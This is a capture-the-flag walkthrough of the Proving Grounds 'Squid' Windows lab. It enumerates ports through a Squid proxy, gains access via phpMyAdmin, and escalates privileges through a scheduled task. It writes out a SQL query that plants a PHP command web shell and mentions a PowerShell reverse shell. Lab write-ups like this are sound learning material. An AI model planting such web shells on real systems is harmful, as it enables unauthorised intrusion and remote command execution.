---
title: Squid
date: 2025-04-06
categories:
- Proving Grounds
- Windows
tags:
- Proving Grounds
- Windows
---


# Squid 🔹
<!-- more -->

## Enumeration

![](../assets/Pasted%20image%2020250406204306.png)

Page at port `3128` is the `squid` proxy error page.

![](../assets/Pasted%20image%2020250406204544.png)

We can connect to the proxy for discovering more ports. We can use [https://github.com/aancw/spose](https://github.com/aancw/spose).

```shell
┌──(kali㉿kali)-[~/Desktop/spose]
└─$ python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1
Using proxy address http://192.168.120.223:3128
127.0.0.1 3306 seems OPEN 
127.0.0.1 8080 seems OPEN  
```

A `mysql` service and a `wamp` service.
We can access the `wamp` one with `foxyproxy`.

![](../assets/Pasted%20image%2020250407180522.png)

## Initial Access

Now, accessing port `8080`, we can see the apps. Trying `root` with `phpmyadmin`.

![](../assets/Pasted%20image%2020250407180636.png)

Put a PHP shell:

```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/wshell.php';
```

And it can be accessed in the root.

So we can put an encoded PowerShell reverse shell and...

![](../assets/Pasted%20image%2020250407180817.png)

![](../assets/Pasted%20image%2020250407180855.png)

## Privilege Escalation

![](../assets/Pasted%20image%2020250407181101.png)

We have restricted permissions. From [this resource](https://github.com/itm4n/FullPowers), we find out that when a `LOCAL SERVICE` or `NETWORK SERVICE` is configured to run with a restricted set of privileges, permissions can be recovered by creating a `scheduled task`. The new process created by the `Task Scheduler Service` will have all the default privileges of the associated user account.

So, first, create a task:

![](../assets/Pasted%20image%2020250407181715.png)

![](../assets/Pasted%20image%2020250407182151.png)

![](../assets/Pasted%20image%2020250407182323.png)

![](../assets/Pasted%20image%2020250407182350.png)

## Post Exploitation

Get the flag.

![](../assets/Pasted%20image%2020250407182404.png)
